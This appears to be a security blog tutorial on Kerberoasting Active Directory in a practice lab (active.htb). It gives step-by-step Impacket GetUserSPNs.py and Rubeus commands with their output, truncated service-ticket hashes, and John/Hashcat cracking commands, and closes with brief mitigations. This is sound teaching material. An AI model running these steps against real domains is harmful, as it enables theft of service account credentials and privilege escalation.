---
title: Cooking With Fire
description: Just another yet random blog to practicing Kerberoasting on Linux and Windows, focusing on practical steps with tools like Rubeus and GetUserSPNs.py.
categories: [Active Directory]
tags: [Windows, Active Directory]
weight: 1
author: SecFortress
---


## **Overview**

I'm sure you've cooked with fire at least once — maybe in your grandma's kitchen, over a campfire on a chilly night, or even on a rugged adventure. But this isn't about roasting marshmallows or perfecting grandma's stew. This is about cooking with a different kind of fire: **Kerberoasting**.


![](https://i.imgur.com/ihzxavI.png)



Forget the deep dives and heavy theories; this is just a no-fluff guide to get hands-on with Kerberoasting, both in Linux and Windows environments. So, grab your hacking tools — it's time to turn up the heat and get cracking!


![](https://i.imgur.com/iFHRvAa.png)


Just before we move on, if you need a lab to practice this attack, you can set one up using the resources listed at the end of this blog. Shout out to a great OG in the field  [onecloudemoji](https://x.com/OneCloudEmoji)


![](https://i.pinimg.com/originals/2d/f7/17/2df717b43d9d9a876a98c41b909e6c65.gif)


## **So, What is Kerberoasting???**

According to a lot of sources, Kerberoasting isn’t about some secret barbecue recipe — it's a clever technique attackers use to extract service account credentials from a Windows Active Directory environment. But let's not get caught up in fancy definitions or technical jargon. Simply put, Kerberoasting is all about leveraging the way Kerberos authentication works to snatch those valuable hashes — the digital keys that can unlock a treasure trove of access across a network.

Unlike other attacks, Kerberoasting doesn't require admin privileges, and it can often go unnoticed by traditional defenses. The best part? You can cook up this attack from your attacker machine, quietly grabbing the ingredients (the service tickets) needed to crack the recipe (the NTLM hash) offline at your leisure.

Now, let’s roll up our sleeves and get cooking! Also here is a typical diagram on how this works if it clicks `\m/`.


```
     [ Attacker Machine ]                           
           |                                        
           |  1. Request Service Ticket (TGS)         
           |   for a Service Account                 
           |                                        
           v                                        
[ Active Directory Domain Controller ]               
     |  (Kerberos Key Distribution Center)             
     |                                               
     |  2. Responds with Service Ticket (TGS)         
     |      Encrypted with Service Account Key       
     v                                               
     [ Attacker Machine ]                            
           |                                        
           |  3. Extract TGS from Memory             
           |   Using Kerberoasting Tool (e.g., Rubeus)
           |                                        
           v                                        
 [ Service Ticket (TGS) Captured ]                   
           |                                        
           |  4. Perform Offline Cracking            
           |   of the TGS (Brute-force NTLM Hash)    
           |                                        
           v                                        
[ Cracked NTLM Hash of Service Account ]              
           |                                         
           |  5. Use Cracked Credentials              
           |   to Access Target Service               
           v                                        
       [ Target Service ]                            
     (e.g., SQL Server, File Share)
```


## **Understanding the Kerberos Hash Types: Know Your Ingredients!**

| Hash                    | Type    |
| ----------------------- | ------- |
| `$krb5tgs$23$*`Type 23  | RC4     |
| `$krb5tgs$18$*` Type 18 | AES-256 |
| `$krb5tgs$17$*` Type 17 | AES-128 |


**So, What Are These Hash Types?**

- **Type 23 (`RC4`):** This is the _classic flavor_ of Kerberoasting hashes. It's a bit outdated, but many systems still serve it up. Type 23 uses the `RC4` encryption algorithm — not the strongest, but still very common, making it a frequent target. It’s like finding a well-aged cheese; you know it’ll crack easier!
    
- **Type 18 (AES-256):** Now we’re talking premium quality! Type 18 uses AES-256 encryption, one of the strongest out there. Extracting this is like biting into a rare, hard-to-crack nut. It’ll take a lot more effort to break, but the payoff could be worth it.
    
- **Type 17 (AES-128):** A little less intense than Type 18, but still not your everyday cracker. AES-128 is more secure than `RC4` but slightly easier to crack than AES-256. Think of it as a medium-hot sauce — not too mild, not too fiery, but still packs a punch.


## **Roasting From Linux**

When we run tools like `GetUserSPNs.py`, we're hunting for Service Principal Names (SPNs) that can help us identify accounts with valuable service tickets. 

```
❯ GetUserSPNs.py -dc-ip 10.129.231.107 active.htb/SVC_TGS
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2024-09-05 08:02:03.710164
```

**So, What Did We Find?**

The output reveals an SPN for **`active/CIFS:445`** associated with the `Administrator` account. This tells us that the `Administrator` is tied to a CIFS (Common Internet File System) service running on port 445. Knowing this, we can now plan our next steps for attacking or enumerating this service.

**What If We Found Other SPNs?**

If we had seen SPNs like **`*/SQL`** or **`*/HTTP`**, we’d know that these accounts are associated with SQL or web services, respectively. This is crucial because it informs our strategy:

- **SQL SPNs (`*/SQL`):** We could explore connecting directly to a SQL server to query data, exploit SQL-specific vulnerabilities, or even dump credentials.
- **HTTP SPNs (`*/HTTP`):** This indicates web services, which might involve web application attacks, directory traversal, or credential brute-forcing over HTTP.


> Note that there are other popular SPNs like `TERMSRV`,`WSMAN`,`RPC`,`LDAP`,`SMTP`,`HOST`. By understanding the SPNs in front of us, we can quickly identify the best services to target and craft our next moves.



Next, By using the `-request` flag with the `GetUserSPNs.py` script, we attempt to retrieve the TGS for the targeted service:

```
❯ GetUserSPNs.py -dc-ip 10.129.231.107 active.htb/SVC_TGS -request
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2024-09-05 08:06:51.093868             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$91797afd7c953--SNIP--
```


**What's Happening Here?**

- The `-request` flag is doing the magic by asking the Domain Controller (DC) for a TGS ticket associated with the **`Administrator`** account for the `CIFS` service.
- The response contains a Kerberos ticket hash in the format **`$krb5tgs$23$*...`** — **Bingo!** This is the jackpot for our Kerberoasting attack.

**Understanding the Ticket:**

- The output provides a **Type 23** Kerberos ticket (`$krb5tgs$23$*`), which uses **RC4 encryption**. Since RC4 is relatively weak by today's standards, it becomes an ideal target for offline brute-forcing or dictionary attacks.
- We can now take this TGS hash and attempt to crack it using popular tools like **`John the Ripper`** or **`Hashcat`** to potentially retrieve the plaintext password.


## **Roasting From Windows**

Before diving into the roasting, I always like to list stats first using the `Rubeus` tool. Why? This helps me see the different encryption types (`Type 23`, `Type 18`, `Type 17`) associated with various accounts and check when the password was last set. It's a good habit for real-world engagements — after all, the fresher the password, the tougher it might be to crack!

```
C:\Users> .\Rubeus.exe kerberoast /stats

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1 


[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : active.htb
[*] Searching path 'LDAP://DC.active.htb/DC=active,DC=htb' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


 ------------------------------------- 
 | Supported Encryption Type | Count |
 ------------------------------------- 
 | RC4_HMAC_DEFAULT          | 1     |
 ------------------------------------- 

 ---------------------------------- 
 | Password Last Set Year | Count |
 ---------------------------------- 
 | 2018                   | 1     |
 ----------------------------------
```

**As shown above, we don't need the `/tgtdeleg` or the `/rc4opsec` switches** because we're not targeting specific TGT delegations or looking for RC4 hashes explicitly. Instead, we're keeping it simple and efficient by focusing on what `Rubeus` reveals:

```
-------------------------------------
| Supported Encryption Type | Count |
-------------------------------------
| RC4_HMAC_DEFAULT          | 1     |
-------------------------------------
```

With this output, we know there's only one account using the RC4 encryption type — a prime target for Kerberoasting! By skipping the extra flags, we streamline the process, making our attack quicker and more straightforward. Just the way we like it: minimal ingredients, maximum flavor!


```
C:\Users> .\Rubeus.exe kerberoast /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : active.htb        
[*] Searching path 'LDAP://DC.active.htb/DC=active,DC=htb' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
'                                                                                                                                                                                             

[*] Total kerberoastable users : 1


[*] SamAccountName         : Administrator                                                     
[*] DistinguishedName      : CN=Administrator,CN=Users,DC=active,DC=htb                        
[*] ServicePrincipalName   : active/CIFS:445                                                   
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec                                                                                                                     [*] PwdLastSet             : 18/7/2018 10:06:40   

[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*Administrator$active.htb$active/CIFS:445@active.htb*$F5--SNIP--
```

> Note that, while we won't delve deeply into every aspect of this attack, We covered practical methods using tools like `Rubeus` and `getuserspn`. Note that these tools offer a variety of options and techniques worth exploring on your own, beyond what we've touched on here.


## **Serving Dishes ; Hash Cracking**

![](https://i.imgur.com/O7aRlqN.png)

This is a very straight forward one as after obtaining the hashes you still need to decrypt them for later use via authentication, You can clearly not submit a full TGS, as a password when asked right ?? 🤣 


```bash
######### Using John-The-Ripper #########
# --wordlist: Specify the path to your wordlist (e.g., rockyou.txt).
# hash.txt: The file containing the TGS hash.

john --wordlist=/path/to/wordlist.txt hash.txt

######### Using Hashcat #########
# -m 13100: Hash type for Kerberos 5 TGS-REP etype 23 (RC4).
# -a 0: Attack mode (0 for dictionary attack).
# hash.txt: The file containing your Kerberos TGS hash.
# /path/to/wordlist.txt: The path to your wordlist.

hashcat -m 13100 -a 0 hash.txt /path/to/wordlist.txt
```


## **Extras : Fixing Kerberos Clock Skew Too Great Resolved**

Ever seen the error “**Kerberos Clock Skew Too Great**” and wondered why your carefully planned attack — or legitimate authentication — isn’t working? This error occurs when there is a significant time difference (typically more than 5 minutes) between the client, server, and the Key Distribution Center (KDC) in a Kerberos environment.


![Image from: https://miro.medium.com/v2/resize:fit:828/format:webp/1*eRZmVfcphNLT9-5PWA1PBQ.png](https://i.imgur.com/NdOYs9o.png)


**Why Does This Happen?**  

Kerberos relies heavily on time synchronization to prevent replay attacks. If the clocks of the devices involved are out of sync beyond the allowed threshold, authentication requests are rejected with this error. This could be fixed with this simple below commands :

```bash
timedatectl set-ntp off
sudo rdate -n [DC-IP of Target]

# -n: use SNTP instead of RFC868 time protocol

######### Reset back to the default once done #########
timedatectl set-ntp on
timedatectl status
```


## **Wrapping Up: The Danger of Kerberoasting**

Kerberoasting is a potent technique in an attacker’s arsenal. Understanding its risks and maintaining robust security practices are vital to protecting your network and sensitive information.

- [x]  **Access to High-Value Accounts:** **Kerberoasting** targets service accounts, often with elevated privileges. Cracking these tickets can lead to full administrative access, allowing attackers to pivot through the network and escalate privileges.

- [x] **Weak Encryption is a Weakness:** Many environments still use outdated encryption types like **RC4 (Type 23)**. These weaker encryption methods are more susceptible to cracking, making them easier targets for attackers with the right tools and techniques.

- [x] **Minimal Effort, High Reward:** Once attackers have the Kerberos tickets, cracking them can be straightforward with tools like **John the Ripper** and **Hashcat**. This means attackers can potentially gain access without significant effort, exploiting weak spots in the system’s security.

- [x] **Mitigation Matters:** Regularly updating service account passwords and using strong encryption methods are crucial defenses. Monitoring and auditing Kerberos tickets and leveraging tools to detect unusual activity can also help mitigate the risk.




## **Resources**


- [*Kerberoasting Blogs From `Adsecurity.org`*](https://adsecurity.org/?s=kerberoast)
- [*Setting Up a Kerberoasting lab by James Hay X `Onecloudemoji`*](https://onecloudemoji.github.io/labbing/pivoting-and-kerberoast-lab-setup/)
